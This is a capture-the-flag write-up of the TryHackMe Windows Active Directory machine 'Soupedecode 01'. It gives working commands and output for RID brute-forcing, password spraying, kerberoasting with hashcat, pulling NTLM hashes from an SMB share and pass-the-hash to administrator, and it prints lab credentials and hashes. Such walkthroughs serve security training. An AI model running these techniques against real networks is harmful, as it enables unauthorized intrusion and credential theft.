# Target
| Category          | Details                                                                    |
|-------------------|----------------------------------------------------------------------------|
| 📝 **Name**       | [Soupedecode 01](https://tryhackme.com/room/soupedecode01)                 |  
| 🏷 **Type**       | THM Machine                                                                |
| 🖥 **OS**         | Windows                                                                    |
| 🎯 **Difficulty** | Easy                                                                       |
| 📁 **Tags**       | Active Directory, RPC rid brute, Password spray, Kerberoast, Pass-the-Hash |

# Scan
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-28 14:19:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-11-27T14:04:10
|_Not valid after:  2026-05-29T14:04:10
|_ssl-date: 2025-11-28T14:21:26+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-28T14:20:46+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49719/tcp open  msrpc         Microsoft Windows RPC
49777/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-11-28T14:20:47
|_  start_date: N/A
```

# Attack path
1. [Discover credentials for user `ybob317` using password spray](#discover-credentials-for-user-ybob317-using-password-spray)
2. [Escalate to `file_svc` by breaking `krb5tgs` hash obtained with kerberoast attack](#escalate-to-file_svc-by-breaking-krb5tgs-hash-obtained-with-kerberoast-attack)
3. [Escalate to `Administrator` user using Pass-the-Hash attack](#escalate-to-administrator-user-using-pass-the-hash-attack)

### Discover credentials for user `ybob317` using password spray

#### Add `dc01.soupedecode.local` and `soupedecode.local` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ echo "$TARGET dc01.soupedecode.local soupedecode.local" | sudo tee -a /etc/hosts
10.80.177.93 dc01.soupedecode.local soupedecode.local
```

#### Use Null Session over RPC to rid-brute users
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ ~/Tools/ridenum/ridenum.py soupedecode.local 500 10000 guest ''
[*] Attempting lsaquery first...This will enumerate the base domain SID
[*] Successfully enumerated base domain SID. Printing information: 
Domain Name: SOUPEDECODE
Domain Sid: S-1-5-21-2986980474-46765180-2505414164
[*] Moving on to extract via RID cycling attack.. 
[*] Enumerating user accounts.. This could take a little while.
<SNIP>
```

#### Remove domain name from `ridenum` output
We will use 'username as password' in password spraying.
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ sed 's/SOUPEDECODE\\//' soupedecode.local_users.txt > users.txt
```

#### Spray username as password using `nextexec smb`
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ netexec smb soupedecode.local -u users.txt -p users.txt --no-bruteforce
SMB         10.80.177.93    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
<SNIP>
SMB         10.80.177.93    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

### Escalate to `file_svc` by breaking `krb5tgs` hash obtained with kerberoast attack

#### Use `ybob317` credentials in kerberoast attack
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ netexec ldap soupedecode.local -u ybob317 -p ybob317 --kerberoasting krb5tgs.hash
SMB         10.80.177.93    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.80.177.93    389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
LDAP        10.80.177.93    389    DC01             Bypassing disabled account krbtgt 
LDAP        10.80.177.93    389    DC01             [*] Total of records returned 5
<SNIP>
```

#### Use `hashcat` to break `krb5tgs` hashes
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ hashcat -m 13100 krb5tgs.hash /usr/share/wordlists/rockyou.txt --quiet
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$3c433c448b1dc4d27f062a0bfa936e92$375737b1d226fde850fce5fb30fd3c525c74e4ea41dbf7e1d15a647eda544ea11fcd090406b0f46856848c8424a6c10d3b8de81be1a17cd2f5ecfec386f833567affe0c7913a35ba95187322dbca528ccc7a41aa1b840236d51576e4853a76e3dffc1eec068c95b10eacdfce7bdb94af608b59a8c50d6231561f105877fe79f60548ca67f7c38c011ebdc7a6be16f1ddd56a44d6b3c9d3030748b1183863562a4a66f993be3f9022359add7554e89d986eb1d3aa4ae80278682f86ca1b81ef82064f5f6a866af7273bddbc369090e5521c6037b7a86950d70a0fb5f8f487199bd53e8f6fd87b25e4fad499486973deb8078675ff3ddfa024e5814961f0977d837d8f4bf0327e6ff70d399c324a712e18514fc9b7afd9fd81095fb1c2b6852c4918f3cb704c0e20656565542aa26febd84682ceac6ac04455730eabba8d5b68b0c1658bac30203813aaa372db10a704b48a9544c929a89dea3c697153445e0edecf8a4f207266a7459c88efc76134d68de805f9a1f7475f1e251450638c0d61e3a441e6a42b0de8029ee213a8153313499e5b44afb2795e63382490a28d24b73475662b3d7c960e085ec85cf33e203000366bb547ce55f02379efcf8699e9281340fd9d53735aeb3e02116fa1d0158c6e9704950e02fb9a557fe915ef73319dfea18c3f4faefb71b69e2fb719829cbdac0d1012709ba72f030a63279bba7ca27cdee1dca8c533d0d40957d81f580637f7f86baa8c21477c34c7bc14870517b8b87722d48ed778ee992ecbefee1af2679cfc18568663bf20e3c1c221310c5bfbe2bee678142178c36d33ad0ee328fb6131b38f636cab045f7a7dee41cb4897d00b4a1beaaaa1d06c056978f9c1428a6e6d8b6f5935db64d9d18fae3eac71433d4ec2cd9b99e210f1cba18d38de4495c1b4f42d4d9054659eace0fcafb9378ab8384f236289c00b73585fee3a6a28dfc41f8cf87fa351ddc379835284f040f9854cf20e5a7b68dd398c3d762fd78ae6b540473f24aa3d3fce2dd20b5377ec78c6a988280574cd276ef2bd017c1e37dc0d47fca73fc4fa13d727e5c7820b4b0fb71c9c87aa5dbf476ae42620a57a9196c0628d9a5d1159901e9b5981a47c3ec8624ad9b65a2a7c3cc964c3f464d68cc9e8e7a051a1003b66c0e004e61fa61d580fc81ae13f3ce81326b31dcc8994e5f4807cf9adc58ebfdebfd1d48f42e6d47a01d5701ac8c978272f2749f6acc50df3a1b77cc12afa3c4179a24e057597d18d84ff9e79778b0d73ef8ff62e146d0ef7b3efce9e5462dc1c827338243b629d5b9525bad13a93050542a78d1337607590cbce9a77401899b3c23f6a0574921e34eb2c4b6bfa88d7a546fb407f874fa24ff6a4ff14ca02bac6f40759390e4ebe8fc49dd4d4318ffa947b95948eb88d80ab81644ba6b2e2972ddad70629090622b27bc65d54042bceef908ed1a6969f707b6630fd0de92bed9535ff8428f7c3f4527ec7ab:Password123!!
```

#### Confirm escalation
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ netexec smb soupedecode.local -u file_svc -p 'Password123!!'                                                  
SMB         10.80.142.124   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.80.142.124   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
```

### Escalate to `Administrator` user using Pass-the-Hash attack

#### Use credentials for `file_svc` user to list SMB shares
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ netexec smb soupedecode.local -u file_svc -p 'Password123!!' --shares
SMB         10.80.177.93    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.80.177.93    445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.80.177.93    445    DC01             [*] Enumerated shares
SMB         10.80.177.93    445    DC01             Share           Permissions     Remark
SMB         10.80.177.93    445    DC01             -----           -----------     ------
SMB         10.80.177.93    445    DC01             ADMIN$                          Remote Admin
SMB         10.80.177.93    445    DC01             backup          READ            
SMB         10.80.177.93    445    DC01             C$                              Default share
SMB         10.80.177.93    445    DC01             IPC$            READ            Remote IPC
SMB         10.80.177.93    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.80.177.93    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.80.177.93    445    DC01             Users 
```

#### Exfiltrate `backup_extract.txt` file from `Users` SMB share
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ smbclient -U 'file_svc%Password123!!' \\\\soupedecode.local\\backup
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 19:41:17 2024
  ..                                 DR        0  Fri Jul 25 19:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 10:41:05 2024

                12942591 blocks of size 4096. 10797796 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (5.0 KiloBytes/sec) (average 5.0 KiloBytes/sec)
```

#### Discover NTLM hashes stored in `backup_extract.txt` file
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ cat backup_extract.txt                 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

#### Extract usernames and NTLM hashes from `backup_extract.txt` file 
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ cat backup_extract.txt | cut -d ':' -f1 > svc.txt && cat backup_extract.txt | cut -d ':' -f4  > ntlm.hash
```

#### Use extracted data in Pass-the-Hash attack
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ netexec smb soupedecode.local -u svc.txt -H ntlm.hash       
SMB         10.80.142.124   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
<SNIP>
SMB         10.80.142.124   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

#### Confirm escalation
User `FileServer$` is member of `BUILTIN\Administrators` group which effectively makes him `Administrator`.
```
┌──(magicrc㉿perun)-[~/attack/THM Soupedecode 01]
└─$ netexec smb soupedecode.local -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 -x 'whoami /groups'
<SNIP>                       
SMB         10.80.142.124   445    DC01             BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
<SNIP>
```